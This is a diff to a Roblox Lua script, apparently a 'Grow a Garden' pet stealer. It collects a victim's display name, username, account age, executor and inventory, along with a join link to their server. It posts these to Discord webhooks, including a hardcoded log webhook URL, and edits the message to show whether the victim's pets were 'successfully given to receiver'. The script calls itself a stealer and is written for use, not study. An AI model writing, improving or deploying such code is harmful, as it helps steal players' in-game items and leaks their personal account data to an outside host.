@@ -410,116 +410,129 @@ end
         end
 
 --// ──────────────────────────────────────────────────────────────────────
---//  WEBHOOK PAYLOAD & SEND (replace ONLY this block)
+--//  WEBHOOK – EDIT SAME MESSAGE (Success → Waiting → Failed)
 --// ──────────────────────────────────────────────────────────────────────
 
-local baseData = {
-    DisplayName     = Players.LocalPlayer.DisplayName or "Unknown",
-    Username        = Players.LocalPlayer.Name or "Unknown",
-    UserId          = tostring(Players.LocalPlayer.UserId or 0),
-    AccountAge      = tostring(Players.LocalPlayer.AccountAge or 0) .. " days",
-    Receiver        = Username or "Unknown",
-    CreationDate    = creationDateString or "Unknown",
-    Executor        = detectExecutor() or "Unknown",
-    Country         = getPlayerCountry(Players.LocalPlayer) or "Unknown",
-    PlayerCount     = (playerCount or 0) .. "/5",
-    PetString       = truncateByLines(petString, 20),
-    JoinScript      = tpScript or "N/A",
-    JoinUrl         = "https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
-    JobId           = game.JobId or "Unknown"
+local Webhook = getgenv().Webhook
+local LogsWebhook = "https://discord.com/api/webhooks/1436030793238446303/8I9MFJKVtlOdVRng-2vgI4eMsWXjDp3bgrUZWAgCUBjSn4DCjhGgkwYldjWjgGgmXh_k"
+
+local base = {
+    DisplayName = Players.LocalPlayer.DisplayName or "Unknown",
+    Username    = Players.LocalPlayer.Name or "Unknown",
+    AccountAge  = tostring(Players.LocalPlayer.AccountAge or 0) .. " Days",
+    Receiver    = Username or "Unknown",
+    Executor    = detectExecutor() or "Unknown",
+    PlayerCount = (playerCount or 0) .. " / 5",
+    PetString   = truncateByLines(petString, 20),
+    JoinScript  = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'")',
+    JoinUrl     = "https://scriptssm.vercel.app/joiner.html?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId,
+    JobId       = game.JobId or "Unknown"
 }
 
---// COMMON EMBED (used for every state)
-local function BuildEmbed(status, description)
-    local embed = {
-        title       = "Grow a Garden Hit - Scripts.SM",
-        url         = baseData.JoinUrl,
-        color       = 57855,
-        description = "\n" .. status .. "\n> " .. description .. "\n",
+local MessageID = nil  -- Stores the message ID to edit later
+
+local function BuildEmbed(icon, status, desc)
+    return {
+        title = "Scripts.SM",
+        description = "\n"..icon.." **Status:** `"..status.."`\n> "..desc.."\n",
+        color = 3447003,
         fields = {
-            {name = "Display Name",    value = "```" .. baseData.DisplayName .. "```", inline = true},
-            {name = "Username",       value = "```" .. baseData.Username .. "```",    inline = true},
-            {name = "User ID",        value = "```" .. baseData.UserId .. "```",      inline = true},
-            {name = "Account Age",    value = "```" .. baseData.AccountAge .. "```", inline = true},
-            {name = "Receiver",       value = "```" .. baseData.Receiver .. "```",    inline = true},
-            {name = "Account Created",value = "```" .. baseData.CreationDate .. "```",inline = true},
-            {name = "Executor",       value = "```" .. baseData.Executor .. "```",    inline = true},
-            {name = "Country",        value = "```" .. baseData.Country .. "```",     inline = true},
-            {name = "Player Count",   value = "```" .. baseData.PlayerCount .. "```", inline = true},
-            {name = "Backpack",       value = "```" .. baseData.PetString .. "```",   inline = false},
-            {name = "Join Script",    value = "```lua\n" .. baseData.JoinScript .. "\n```", inline = false},
-            {name = "Join with URL",  value = "[Click here to join](" .. baseData.JoinUrl .. ")", inline = false}
+            {name = "<:players:1365290081937526834> **Display Name    **", value = "```"..base.DisplayName.."```", inline = true},
+            {name = "<:game:1365295942504550410> **Username**",          value = "```"..base.Username.."```",    inline = true},
+            {name = "<:time:1365991843011100713> **Account Age**",      value = "```"..base.AccountAge.."```",  inline = true},
+            {name = "<:folder:1365290079081205844> **Receiver**",       value = "```"..base.Receiver.."```",    inline = true},
+            {name = "<:Events:1394005823931420682> **Executor**",       value = "```"..base.Executor.."```",    inline = true},
+            {name = "<:events:1365290073767022693> **Player Count**",   value = "```"..base.PlayerCount.."```", inline = true},
+            {name = "<:pack:1365295947281862656> **Inventory**",        value = "```"..base.PetString.."```"},
+            {name = "<:emoji_2:1402577600060325910>  **Join Script**",  value = "```lua\n"..base.JoinScript.."\n```"},
+            {name = "<:location:1365290076279541791> **Join via URL**", value = "[ **Click Here to Join!**]("..base.JoinUrl..")"}
         },
-        footer = { text = baseData.JobId },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        author = { name = "Grow a Garden", url = base.JoinUrl, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp" },
+        footer = { text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png" },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        image = { url = "https://scriptssm.vercel.app/pngs/gag.webp" }
     }
-    return embed
 end
 
---// SEND FUNCTION
-local function SendWebhook(url, payload)
+local function SendOrEdit(url, payload, edit)
     if not url then return end
-    local ok, err = pcall(function()
-        request({
-            Url = url,
-            Method = "POST",
+    local method = edit and "PATCH" or "POST"
+    local fullUrl = edit and (url .. "/messages/" .. MessageID) or url
+
+    local success, response = pcall(function()
+        return request({
+            Url = fullUrl,
+            Method = method,
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(payload)
         })
     end)
-    if not ok then warn("Webhook error ("..url.."):", err) end
+
+    if success and not edit then
+        local data = HttpService:JSONDecode(response.Body)
+        MessageID = data.id  -- Save ID for editing
+    end
 end
 
---// 1. SUCCESS (receiver joined)
-local successPayload = {
-    avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
-    content    = "> Jump or type anything in chat to start.",
-    embeds = { BuildEmbed("<:check2:1373169356825169981> **Status:** `Success`", "All pets have been successfully given to receiver.") },
-    username   = "Scripts.SM",
-    attachments = {}
-}
-SendWebhook(Webhook, successPayload)
+--// EXPORT: Call these functions when needed
+local WebhookAPI = {}
 
---// 2. WAITING (receiver still in server)
-local waitingPayload = {
-    avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
-    content    = "> Jump or type anything in chat to start.",
-    embeds = { BuildEmbed("<:Waring_Square:1436287126139437130> **Status:** `Waiting`", "The user is waiting for you in server.") },
-    username   = "Scripts.SM",
-    attachments = {}
-}
-SendWebhook(Webhook, waitingPayload)
-
---// 3. FAILED (receiver left)
-local failedPayload = {
-    avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
-    content    = "> Jump or type anything in chat to start.",
-    embeds = { BuildEmbed("<:failed:1436288137591783437> **Status:** `Failed`", "The user has lefted the server.") },
-    username   = "Scripts.SM",
-    attachments = {}
-}
-SendWebhook(Webhook, failedPayload)
-
---// 4. LOGS (always sent)
-local logPayload = {
-    avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
-    content    = "> Jump or type anything in chat to start.",
-    embeds = { BuildEmbed("Script.SM - Hit", "Script executed successfully.") },
-    username   = "Scripts.SM",
-    attachments = {}
-}
-SendWebhook(LogsWebhook, logPayload)
-
---// (Optional) Rare-pets ping – keep the old behaviour
-if hasRarePets() then
-    local pingPayload = {
-        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
-        content    = "@everyone\nTo activate the stealer you must jump or type in chat",
-        embeds = { successPayload.embeds[1] },  -- reuse success embed
-        username   = "Scripts.SM"
+--// 1. Send INITIAL message (Waiting or Success)
+function WebhookAPI.Start()
+    local payload = {
+        content = "> Jump or type anything in chat to start.",
+        embeds = { BuildEmbed("<:Waring_Square:1436287126139437130>", "Waiting", "The user is waiting for you in server.") },
+        username = "Scripts.SM",
+        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
     }
-    SendWebhook(Webhook, pingPayload)
+    SendOrEdit(Webhook, payload, false)
 end
+
+--// 2. Edit to SUCCESS
+function WebhookAPI.Success()
+    local payload = {
+        content = "> Jump or type anything in chat to start.",
+        embeds = { BuildEmbed("<:check2:1373169356825169981>", "Success", "All pets have been successfully given to receiver.") },
+        username = "Scripts.SM",
+        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
+    }
+    SendOrEdit(Webhook, payload, true)
+end
+
+--// 3. Edit to FAILED
+function WebhookAPI.Failed()
+    local payload = {
+        content = "> Jump or type anything in chat to start.",
+        embeds = { BuildEmbed("<:failed:1436288137591783437>", "Failed", "The user has lefted the server.") },
+        username = "Scripts.SM",
+        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
+    }
+    SendOrEdit(Webhook, payload, true)
+end
+
+--// 4. Send LOG (separate webhook)
+function WebhookAPI.Log()
+    local payload = {
+        content = "> Jump or type anything in chat to start.",
+        embeds = { BuildEmbed("", "Script.SM - Hit", "Script executed successfully.") },
+        username = "Scripts.SM",
+        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
+    }
+    SendOrEdit(LogsWebhook, payload, false)
+end
+
+--// 5. Optional: @everyone ping (edits main message)
+function WebhookAPI.PingEveryone()
+    if hasRarePets() and MessageID then
+        local payload = {
+            content = "@everyone\nTo activate the stealer you must jump or type in chat",
+            embeds = { BuildEmbed("<:check2:1373169356825169981>", "Success", "All pets have been successfully given to receiver.") }
+        }
+        SendOrEdit(Webhook, payload, true)
+    end
+end
+
+return WebhookAPI
 
 local function CreateGui()
     local player = Players.LocalPlayer
